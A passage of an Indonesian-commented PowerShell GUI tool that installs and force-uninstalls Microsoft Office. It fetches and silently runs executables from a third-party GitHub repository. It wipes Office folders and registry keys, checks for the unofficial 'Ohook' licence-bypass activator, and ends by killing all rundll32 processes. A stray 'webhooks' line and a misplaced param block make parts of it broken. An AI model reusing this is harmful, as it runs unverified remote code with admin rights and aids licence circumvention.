            if ($radioButton2024Pro.IsChecked -eq $true) {$productId = "ProPlus2024$licType"; $productName = 'Microsoft 365 and Office Professional LTSC 2024'; $i++}
            if ($radioButton2024Std.IsChecked -eq $true) {$productId = "Standard2024$licType"; $productName = 'Office 2024 Standard LTSC'; $i++}
            if ($radioButton2024ProjectPro.IsChecked -eq $true) {$productId = "ProjectPro2024$licType"; $productName = 'Project Pro 2024'; $i++}
            if ($radioButton2024ProjectStd.IsChecked -eq $true) {$productId = "ProjectStd2024$licType"; $productName = 'Project Standard 2024'; $i++}
            if ($radioButton2024VisioPro.IsChecked -eq $true) {$productId = "VisioPro2024$licType"; $productName = 'Visio Pro 2024'; $i++}
            if ($radioButton2024VisioStd.IsChecked -eq $true) {$productId = "VisioStd2024$licType"; $productName = 'Visio Standard 2024'; $i++}
            if ($radioButton2024Word.IsChecked -eq $true) {$productId = "Word2024$licType"; $productName = 'Microsoft Word LTSC 2024'; $i++}
            if ($radioButton2024Excel.IsChecked -eq $true) {$productId = "Excel2024$licType"; $productName = 'Microsoft Excel LTSC 2024'; $i++}
            if ($radioButton2024PowerPoint.IsChecked -eq $true) {$productId = "PowerPoint2024$licType"; $productName = 'Microsoft PowerPoint LTSC 2024'; $i++}
            if ($radioButton2024Outlook.IsChecked -eq $true) {$productId = "Outlook2024$licType"; $productName = 'Microsoft Outlook LTSC 2024'; $i++}
            if ($radioButton2024Publisher.IsChecked -eq $true) {$productId = "Publisher2024$licType"; $productName = 'Microsoft Publisher LTSC 2024'; $i++}
            if ($radioButton2024Access.IsChecked -eq $true) {$productId = "Access2024$licType"; $productName = 'Microsoft Access LTSC 2024'; $i++}
            if ($radioButton2024HomeBusiness.IsChecked -eq $true) {$productId = "HomeBusiness2024Retail"; $productName = 'Office HomeBusiness 2024'; $i++}
            if ($radioButton2024HomeStudent.IsChecked -eq $true) {$productId = "HomeStudent2024Retail"; $productName = 'Office HomeStudent LTSC 2024'; $i++}

        # For Office 2021
            if ($radioButton2021Pro.IsChecked -eq $true) {$productId = "ProPlus2021$licType"; $productName = 'Microsoft Office Professional LTSC 2021'; $i++}
            if ($radioButton2021Std.IsChecked -eq $true) {$productId = "Standard2021$licType"; $productName = 'Office 2021 Standard LTSC'; $i++}
            if ($radioButton2021ProjectPro.IsChecked -eq $true) {$productId = "ProjectPro2021$licType"; $productName = 'Project Pro 2021'; $i++}
            if ($radioButton2021ProjectStd.IsChecked -eq $true) {$productId = "ProjectStd2021$licType"; $productName = 'Project Standard 2021'; $i++}
            if ($radioButton2021VisioPro.IsChecked -eq $true) {$productId = "VisioPro2021$licType"; $productName = 'Visio Pro 2021'; $i++}
            if ($radioButton2021VisioStd.IsChecked -eq $true) {$productId = "VisioStd2021$licType"; $productName = 'Visio Standard 2021'; $i++}
            if ($radioButton2021Word.IsChecked -eq $true) {$productId = "Word2021$licType"; $productName = 'Microsoft Word LTSC 2021'; $i++}
            if ($radioButton2021Excel.IsChecked -eq $true) {$productId = "Excel2021$licType"; $productName = 'Microsoft Excel LTSC 2021'; $i++}
            if ($radioButton2021PowerPoint.IsChecked -eq $true) {$productId = "PowerPoint2021$licType"; $productName = 'Microsoft PowerPoint LTSC 2021'; $i++}
            if ($radioButton2021Outlook.IsChecked -eq $true) {$productId = "Outlook2021$licType"; $productName = 'Microsoft Outlook LTSC 2021'; $i++}
            if ($radioButton2021Publisher.IsChecked -eq $true) {$productId = "Publisher2021$licType"; $productName = 'Microsoft Publisher LTSC 2021'; $i++}
            if ($radioButton2021Access.IsChecked -eq $true) {$productId = "Access2021$licType"; $productName = 'Microsoft Access LTSC 2021'; $i++}
            if ($radioButton2021HomeBusiness.IsChecked -eq $true) {$productId = "HomeBusiness2021Retail"; $productName = 'Office HomeBusiness 2021'; $i++}
            if ($radioButton2021HomeStudent.IsChecked -eq $true) {$productId = "HomeStudent2021Retail"; $productName = 'Office HomeStudent LTSC 2021'; $i++}

        # For Office 2019
            if ($radioButton2019Pro.IsChecked -eq $true) {$productId = "ProPlus2019$licType"; $productName = 'Microsoft Office 2019 Professional Plus'; $i++}
            if ($radioButton2019Std.IsChecked -eq $true) {$productId = "Standard2019$licType"; $productName = 'Office 2019 Standard'; $i++}
            if ($radioButton2019ProjectPro.IsChecked -eq $true) {$productId = "ProjectPro2019$licType"; $productName = 'Project Pro 2019'; $i++}
            if ($radioButton2019ProjectStd.IsChecked -eq $true) {$productId = "ProjectStd2019$licType"; $productName = 'Project Standard 2019'; $i++}
            if ($radioButton2019VisioPro.IsChecked -eq $true) {$productId = "VisioPro2019$licType"; $productName = 'Visio Pro 2019'; $i++}
            if ($radioButton2019VisioStd.IsChecked -eq $true) {$productId = "VisioStd2019$licType"; $productName = 'Visio Standard 2019'; $i++}
            if ($radioButton2019Word.IsChecked -eq $true) {$productId = "Word2019$licType"; $productName = 'Microsoft Word 2019'; $i++}
            if ($radioButton2019Excel.IsChecked -eq $true) {$productId = "Excel2019$licType"; $productName = 'Microsoft Excel 2019'; $i++}
            if ($radioButton2019PowerPoint.IsChecked -eq $true) {$productId = "PowerPoint2019$licType"; $productName = 'Microsoft PowerPoint 201p'; $i++}
            if ($radioButton2019Outlook.IsChecked -eq $true) {$productId = "Outlook2019$licType"; $productName = 'Microsoft Outlook 2019'; $i++}
            if ($radioButton2019Publisher.IsChecked -eq $true) {$productId = "Publisher2019$licType"; $productName = 'Microsoft Publisher 2019'; $i++}
            if ($radioButton2019Access.IsChecked -eq $true) {$productId = "Access2019$licType"; $productName = 'Microsoft Access 2019'; $i++}
            if ($radioButton2019HomeBusiness.IsChecked -eq $true) {$productId = "HomeBusiness2019Retail"; $productName = 'Office HomeBusiness 2019'; $i++}
            if ($radioButton2019HomeStudent.IsChecked -eq $true) {$productId = "HomeStudent2019Retail"; $productName = 'Office HomeStudent 2019'; $i++}

        # For Office 2016
            if ($radioButton2016Pro.IsChecked -eq $true) {$productId = "ProfessionalRetail"; $productName = 'Microsoft Office 2016 Professional Plus'; $i++}
            if ($radioButton2016Std.IsChecked -eq $true) {$productId = "StandardRetail"; $productName = 'Office 2016 Standard'; $i++}
            if ($radioButton2016ProjectPro.IsChecked -eq $true) {$productId = "ProjectProRetail"; $productName = 'Microsoft Project Pro 2016'; $i++}
            if ($radioButton2016ProjectStd.IsChecked -eq $true) {$productId = "ProjectStdRetail"; $productName = 'Microsoft Project Standard 2016'; $i++}
            if ($radioButton2016VisioPro.IsChecked -eq $true) {$productId = "VisioProRetail"; $productName = 'Microsoft Visio Pro 2016'; $i++}
            if ($radioButton2016VisioStd.IsChecked -eq $true) {$productId = "VisioStdRetail"; $productName = 'Microsoft Visio Standard 2016'; $i++}
            if ($radioButton2016Word.IsChecked -eq $true) {$productId = "WordRetail"; $productName = 'Microsoft Word 2016'; $i++}
            if ($radioButton2016Excel.IsChecked -eq $true) {$productId = "ExcelRetail"; $productName = 'Microsoft Excel 2016'; $i++}
            if ($radioButton2016PowerPoint.IsChecked -eq $true) {$productId = "PowerPointRetail"; $productName = 'Microsoft PowerPoint 2016'; $i++}
            if ($radioButton2016Outlook.IsChecked -eq $true) {$productId = "OutlookRetail"; $productName = 'Microsoft Outlook 2016'; $i++}
            if ($radioButton2016Publisher.IsChecked -eq $true) {$productId = "PublisherRetail"; $productName = 'Microsoft Publisher 2016'; $i++}
            if ($radioButton2016Access.IsChecked -eq $true) {$productId = "AccessRetail"; $productName = 'Microsoft Access 2016'; $i++}
            if ($radioButton2016OneNote.IsChecked -eq $true) {$productId = "OneNoteRetail"; $productName = 'Microsoft Onenote 2016'; $i++}

        # For Office 2013
            if ($radioButton2013Pro.IsChecked -eq $true) {$productId = "ProfessionalRetail"; $uri = $uri2013; $productName = 'Microsoft Office 2013 Professional Plus'; $i++}
            if ($radioButton2013Std.IsChecked -eq $true) {$productId = "StandardRetail"; $uri = $uri2013; $productName = 'Office 2013 Standard'; $i++}
            if ($radioButton2013ProjectPro.IsChecked -eq $true) {$productId = "ProjectProRetail"; $uri = $uri2013; $productName = 'Microsoft Project Pro 2013'; $i++}
            if ($radioButton2013ProjectStd.IsChecked -eq $true) {$productId = "ProjectStdRetail"; $uri = $uri2013; $productName = 'Microsoft Project Standard 2013'; $i++}
            if ($radioButton2013VisioPro.IsChecked -eq $true) {$productId = "VisioProRetail"; $uri = $uri2013; $productName = 'Microsoft Visio Pro 2013'; $i++}
            if ($radioButton2013VisioStd.IsChecked -eq $true) {$productId = "VisioStdRetail"; $uri = $uri2013; $productName = 'Microsoft Visio Standard 2013'; $i++}
            if ($radioButton2013Word.IsChecked -eq $true) {$productId = "WordRetail"; $uri = $uri2013; $productName = 'Microsoft Word 2013'; $i++}
            if ($radioButton2013Excel.IsChecked -eq $true) {$productId = "ExcelRetail"; $uri = $uri2013; $productName = 'Microsoft Excel 2013'; $i++}
            if ($radioButton2013PowerPoint.IsChecked -eq $true) {$productId = "PowerPointRetail"; $uri = $uri2013; $productName = 'Microsoft PowerPoint 2013'; $i++}
            if ($radioButton2013Outlook.IsChecked -eq $true) {$productId = "OutlookRetail"; $uri = $uri2013; $productName = 'Microsoft Outlook 2013'; $i++}
            if ($radioButton2013Publisher.IsChecked -eq $true) {$productId = "PublisherRetail"; $uri = $uri2013; $productName = 'Microsoft Publisher 2013'; $i++}
            if ($radioButton2013Access.IsChecked -eq $true) {$productId = "AccessRetail"; $uri = $uri2013; $productName = 'Microsoft Access 2013'; $i++}

        # Update the shared hashtable
            $sync.arch = $arch
            $sync.mode = $mode
            $sync.language = $language
            $sync.UIstatus = $UIstatus
            $sync.productName = $productName

            if ($i -eq '1') {
                PreparingOffice
                $PSIinstance = [powershell]::Create().AddScript($DownloadInstallOffice)
                $PSIinstance.Runspace = $runspace
                $PSIinstance.BeginInvoke()
                Write-Host " $UIstatus $productName"
            } else {
                $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Foreground = "Red" })
                $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.FontWeight = "Bold" })
                $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "Please select an Office version." })
                Write-Host "Please select an Office version." -ForegroundColor Red
            }
    })

# Uninstall all installed Microsoft Office apps.
    $UninstallOffice = {

        $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "Uninstalling Microsoft Office..." })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Visibility = "Hidden" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.BorderBrush = "#FF707070" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.IsIndeterminate = $true })
        $sync.Form.Dispatcher.Invoke([action] { $sync.image.Visibility = "Visible" })

        # Tentukan lokasi setup.exe untuk versi baru dan lama
        $SetupNew = "$env:TEMP\c2r\setup.exe"
        $SetupOld = "$env:TEMP\c2r\setupold.exe"

        # URL untuk mengunduh Office Deployment Tool yang sesuai
        $UrlNew = "https://github.com/hinzdc/get/raw/main/office/bin/setup.exe"
        $UrlOld = "https://github.com/hinzdc/get/raw/main/office/bin/bin2013.exe"

        # Fungsi untuk mengunduh setup.exe jika belum ada
        function Download-Setup {
            param (
                [string]$Url,
                [string]$Destination
            )
            if (!(Test-Path $Destination)) {
                try {
                    Invoke-WebRequest -Uri $Url -OutFile $Destination -ErrorAction Stop
                    Write-Host "Berhasil mengunduh $Destination"
                } catch {
                    Write-Host "Gagal mengunduh $Url"
                    exit 1
                }
            }
        }

        # Fungsi untuk mendeteksi versi Office yang terinstal
        function Get-InstalledOfficeVersion {
            $OfficeKeys = @(
                "HKLM:\SOFTWARE\Microsoft\Office",
                "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Office"
            )

            $DetectedVersions = @()

            foreach ($Key in $OfficeKeys) {
                if (Test-Path "$Key\16.0") {
                    $DetectedVersions += "2016-2024"
                }
                if (Test-Path "$Key\15.0") {
                    $DetectedVersions += "2013"
                }
            }

            return $DetectedVersions
        }
        
        # ==================================================================
        #  STOP RUNNING OFFICE APP
        # ==================================================================
        Function Stop-OfficeProcess {
            $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "> Stop Running Office Application." })
            Stop-Service -Name "Clicktorunsvc" -Force -ErrorAction SilentlyContinue
            Write-Host "Stopping running Office applications ..."
            $OfficeProcessesArray = "OfficeClickToRun", "OfficeC2RClient", "officesvcmgr", "lync", "winword", "excel", "msaccess", "mstore", "infopath", "setlang", "msouc", "ois", "onenote", "outlook", "powerpnt", "mspub", "groove", "visio", "winproj", "graph", "teams"
            foreach ($ProcessName in $OfficeProcessesArray) {
                if (get-process -Name $ProcessName -ErrorAction SilentlyContinue) {
                    if (Stop-Process -Name $ProcessName -Force -ErrorAction SilentlyContinue) {
                        Write-Output "Process $ProcessName was stopped."
                    }
                    else {
                        Write-Warning "Process $ProcessName could not be stopped."
                    }
                } 
            }
        }

        # Fungsi untuk menjalankan uninstalasi
        function Uninstall-Office {
            $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "> Uninstall Office App." })
            param (
                [string]$SetupPath,
                [string]$ConfigFile
            )

            if (Test-Path $SetupPath) {
                Write-Host " Menjalankan uninstalasi menggunakan $SetupPath..."
                Start-Process -FilePath $SetupPath -ArgumentList "/configure $ConfigFile" -Wait -NoNewWindow
                Write-Host " Proses uninstall selesai untuk $SetupPath"
            } else {
                Write-Host " File setup tidak ditemukan: $SetupPath"
                exit 1
            }
        }

        # ==================================================================
        #  HAPUS FOLDER INSTALASI OFFICE
        # ==================================================================
        function Remove-OfficeFoldersAndRegistry {

            $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "> Cleanup Office Folder." })
            $folders = @(
                "$env:PROGRAMFILES\Microsoft Office 15",
                "$env:PROGRAMFILES\Common Files\Microsoft Office 15",
                "$env:PROGRAMFILES\Common Files\Microsoft Office 16",
                "$env:PROGRAMFILES\Common Files\microsoft shared\ClickToRun",
                "$env:PROGRAMFILES(x86)\Microsoft Office 15",
                "$env:PROGRAMFILES(x86)\Common Files\Microsoft Office 15",
                "$env:PROGRAMFILES(x86)\Common Files\Microsoft Office 16",
                "$env:PROGRAMFILES(x86)\Microsoft Office\root",
                "$env:PROGRAMFILES(x86)\Microsoft Office",
                "$env:PROGRAMFILES\Microsoft Office\root",
                "$env:PROGRAMFILES\Microsoft Office",
                "$env:COMMONPROGRAMFILES(x86)\Microsoft Shared\Office*",
                "$env:COMMONPROGRAMFILES\Microsoft Shared\Office*",
                "$env:PROGRAMDATA\Microsoft\Office",
                "$env:PROGRAMDATA\Microsoft\ClickToRun",
                "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Microsoft Office Tools*",
                "$env:APPDATA\Microsoft\Templates\Normal.dotm",
                "$env:APPDATA\Microsoft\Templates\Word.dotx",
                "$env:APPDATA\Microsoft\document building blocks\3082\15\Building Blocks.dotx",
                "$env:USERPROFILE\Microsoft Office",
                "$env:USERPROFILE\Microsoft Office 15",
                "$env:USERPROFILE\Microsoft Office 16"
            )
            foreach ($folder in $folders) {
                if (Test-Path $folder) {
                    Takeown /f $folder /r /d Y
                    Attrib -r -s -h $folder /s /d
                    Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
                }
            }

            # ==================================================================
            # HAPUS SHORTCUT DARI DESKTOP, START MENU DAN TASKBAR
            # ==================================================================
            $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "> Remove ShortCut." })
            $shortcutPaths = @(
                "$env:PUBLIC\Desktop",  # Desktop semua pengguna
                "$env:USERPROFILE\Desktop",  # Desktop user saat ini
                "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Microsoft Office*",
                "$env:USERPROFILE\Microsoft\Windows\Start Menu\Programs\Microsoft Office*",
                "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",  # Start Menu pengguna saat ini
                "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs"  # Start Menu semua pengguna
            )

            # Daftar shortcut Office yang akan dihapus
            $shortcuts = @(
                # Versi Office 2013 & 2016
                "Word 2013.lnk", "Excel 2013.lnk", "PowerPoint 2013.lnk", "Outlook 2013.lnk",
                "Word 2016.lnk", "Excel 2016.lnk", "PowerPoint 2016.lnk", "Outlook 2016.lnk",
                
                # Versi Office 2019, 2021, 2024 (tidak ada angka tahunnya)
                "Word.lnk", "Excel.lnk", "PowerPoint.lnk", "Outlook*.lnk", "OneNote.lnk",
                "Access.lnk", "Publisher.lnk", "Visio.lnk", "Project.lnk"
                )
                
                # Hapus shortcut dari Desktop & Start Menu
                foreach ($path in $shortcutPaths) {
                    foreach ($shortcut in $shortcuts) {
                    $shortcutFullPath = "$path\$shortcut"
                    if (Test-Path $shortcutFullPath) {
                        Try {
                            Remove-Item -Path $shortcutFullPath -Force -ErrorAction Stop
                            Write-Host "Berhasil menghapus shortcut: $shortcutFullPath" -ForegroundColor Green
                        } Catch {
                            Write-Host "Gagal menghapus shortcut: $shortcutFullPath - $_" -ForegroundColor Yellow
                        }
                    }
                }
            }
            
            Write-Host "Menghapus shortcut yang dipin di Taskbar..." -ForegroundColor Cyan
            
            $taskbarPath = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
            if (Test-Path $taskbarPath) {
                foreach ($shortcut in $shortcuts) {
                    $taskbarShortcut = "$taskbarPath\$shortcut"
                    if (Test-Path $taskbarShortcut) {
                        Try {
                            Remove-Item -Path $taskbarShortcut -Force -ErrorAction Stop
                            Write-Host "Berhasil menghapus pinned shortcut: $taskbarShortcut" -ForegroundColor Green
                        } Catch {
                            Write-Host "Gagal menghapus pinned shortcut: $taskbarShortcut - $_" -ForegroundColor Yellow
                        }
                    }
                }
            } else {
                Write-Host "Folder Taskbar shortcut tidak ditemukan. Lewati..." -ForegroundColor Gray
            }
            
            Write-Host "Proses penghapusan shortcut selesai!" -ForegroundColor Magenta
            
            
            # ==================================================================
            #  HAPUS REGISTRY OFFICE
            # ==================================================================
            $registryKeys = @(
                "HKEY_USERS\.DEFAULT\Software\Microsoft\Office",
                "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Office",
                "HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Registration",
                "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Registration",
                "HKEY_CURRENT_USER\Software\Microsoft\Office\Registration",
                "HKEY_CURRENT_USER\Software\Microsoft\Office\ClickToRun",
                "HKEY_CURRENT_USER\Software\Microsoft\Office",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\15.0",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\16.0",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRunStore",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\excel.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powerpnt.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\onenote.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\outlook.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspub.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msaccess.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\infopath.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\groove.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lync.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AppVISV",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Lync16",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Lync15"
            )

            # Loop untuk menghapus registry
            foreach ($key in $registryKeys) {
                $regPath = "Registry::$key"
                
                if (Test-Path $regPath) {
                    Try {
                        Remove-Item -Path $regPath -Recurse -Force -ErrorAction Stop
                        Write-Host "Berhasil menghapus: $key" -ForegroundColor Green
                    } Catch {
                        Write-Host "Gagal menghapus: $key - $_" -ForegroundColor Yellow
                    }
                } else {
                    Write-Host "Tidak ditemukan: $key" -ForegroundColor Gray
                }
            }


        }

        # Tentukan versi Office yang ditemukan
        $InstalledVersions = Get-InstalledOfficeVersion

        # Jika tidak ada Office yang terdeteksi
        if ($InstalledVersions.Count -eq 0) {
            Write-Host "Tidak ada Microsoft Office yang terdeteksi."
            exit 0
        }

        # Unduh setup jika diperlukan
        if ("2016-2024" -in $InstalledVersions) {
            Download-Setup -Url $UrlNew -Destination $SetupNew
        }
        if ("2013" -in $InstalledVersions) {
            Download-Setup -Url $UrlOld -Destination $SetupOld
        }

        # Konfigurasi file XML untuk uninstalasi
        $ConfigPathNew = "$env:TEMP\uninstall_office_new.xml"
        $ConfigPathOld = "$env:TEMP\uninstall_office_old.xml"

        @"
        <Configuration>
            <Remove All="TRUE"/>
            <RemoveMSI All="TRUE"/>
            <Display Level="None" AcceptEULA="TRUE"/>
        </Configuration>
"@ | Out-File -Encoding utf8 $ConfigPathNew

        @"
        <Configuration>
            <Remove All="TRUE"/>
            <RemoveMSI All="TRUE"/>
            <Display Level="None" AcceptEULA="TRUE"/>
        </Configuration>
"@ | Out-File -Encoding utf8 $ConfigPathOld

        Stop-OfficeProcess
        # Jalankan uninstall berdasarkan versi yang terdeteksi
        if ("2013" -in $InstalledVersions -and "2016-2024" -in $InstalledVersions) {
            Write-Host "Terdeteksi Office 2013 dan 2016-2024. Akan menjalankan keduanya."
            Uninstall-Office -SetupPath $SetupNew -ConfigFile $ConfigPathNew
            Uninstall-Office -SetupPath $SetupOld -ConfigFile $ConfigPathOld
        } elseif ("2016-2024" -in $InstalledVersions) {
            Write-Host "Terdeteksi Office 2016-2024. Menjalankan uninstall menggunakan setup baru."
            Uninstall-Office -SetupPath $SetupNew -ConfigFile $ConfigPathNew
        } elseif ("2013" -in $InstalledVersions) {
            Write-Host "Terdeteksi Office 2013. Menjalankan uninstall menggunakan setup lama."
            Uninstall-Office -SetupPath $SetupOld -ConfigFile $ConfigPathOld
        }

        # Hapus folder dan registry setelah uninstalasi
        Write-Host " Membersihkan folder dan registry Microsoft Office..."
        Stop-Service -Name "Clicktorunsvc" -Force -ErrorAction SilentlyContinue
        Remove-Service -Name "Clicktorunsvc" -Force -ErrorAction SilentlyContinue
        Remove-OfficeFoldersAndRegistry

        Write-Host "Proses uninstall selesai."

        $sync.Form.Dispatcher.Invoke([action] { $sync.image.Visibility = "Hidden" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Visibility = 'Visible' })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Content = 'SUBMIT' })
        $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "Uninstall Completed" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.IsIndeterminate = $false })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.Value = '100' })

        # Cleanup
        Remove-Item $env:temp\ClickToRun -Recurse -Force
    }

    $UninstallOfficeScrub = {

        
    }

    $UninstallOfficeSARA = {

        
    }

    $buttonRemoveAll.Add_Click({

        Write-Host " Uninstalling Microsoft Office.."
        if ($radioButtonRemoveAllApp.IsChecked) {
            $workingDir = New-Item -Path $env:temp\ClickToRun -ItemType Directory -Force
            Set-Location $workingDir
            $sync.workingDir = $workingDir
            $sync.uninstall = $uninstall

            $PSIinstance = [powershell]::Create().AddScript($UninstallOffice)
            $PSIinstance.Runspace = $runspace
            $PSIinstance.BeginInvoke()
        }
    })
<#
    $buttonScrub.Add_Click({

        if ($radioButtonRemoveAllApp.IsChecked) {
            $workingDir = New-Item -Path $env:temp\ClickToRun -ItemType Directory -Force
            Set-Location $workingDir
            $sync.workingDir = $workingDir
            $sync.uninstall = $uninstall

            $PSIinstance = [powershell]::Create().AddScript($UninstallOfficex)
            $PSIinstance.Runspace = $runspace
            $PSIinstance.BeginInvoke()
        }
    })

    $buttonSARA.Add_Click({

        if ($radioButtonRemoveAllApp.IsChecked) {
            $workingDir = New-Item -Path $env:temp\ClickToRun -ItemType Directory -Force
            Set-Location $workingDir
            $sync.workingDir = $workingDir
            $sync.uninstall = $uninstall

            $PSIinstance = [powershell]::Create().AddScript($UninstallOfficeSARA)
            $PSIinstance.Runspace = $runspace
            $PSIinstance.BeginInvoke()
        }
    })
#>
$null = $Form.ShowDialog()

function CheckOhook {
    $ohook = 0
    $paths = @("${env:ProgramFiles}", "${env:ProgramW6432}", "${env:ProgramFiles(x86)}")

    foreach ($version in 15, 16) {
        foreach ($path in $paths) {
            if (Test-Path "$path\Microsoft Office\Office$version\sppc*.dll") {
                $ohook = 1
            }
        }
    }

    foreach ($systemFolder in "System", "SystemX86") {
        foreach ($officeFolder in "Office 15", "Office") {
            foreach ($path in $paths) {
                if (Test-Path "$path\Microsoft $officeFolder\root\vfs\$systemFolder\sppc*.dll") {
                    $ohook = 1
                }
            }
        }
    }

    if ($ohook -eq 0) {
        return @"
        // Ohook Office Activation Status //
        Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi.
"@
    }
    
    return @"
    // Ohook Office Activation Status //
    
    Ohook for permanent Office activation is installed.
"@
}
webhooks
# Tampilkan kembali
$WinAPI::ShowWindow($hwnd, 5) | Out-Null
Write-Host
Write-Host " PRESS " -NoNewLine
Write-Host " ENTER " -NoNewLine -BackgroundColor red -ForegroundColor white
Write-Host " TO EXIT:" -NoNewLine
read-host
# Membuka jendela CMD dan mengeksekusi perintah taskkill
Start-Process cmd.exe -ArgumentList '/c timeout /t 1 & taskkill /F /IM rundll32.exe /T'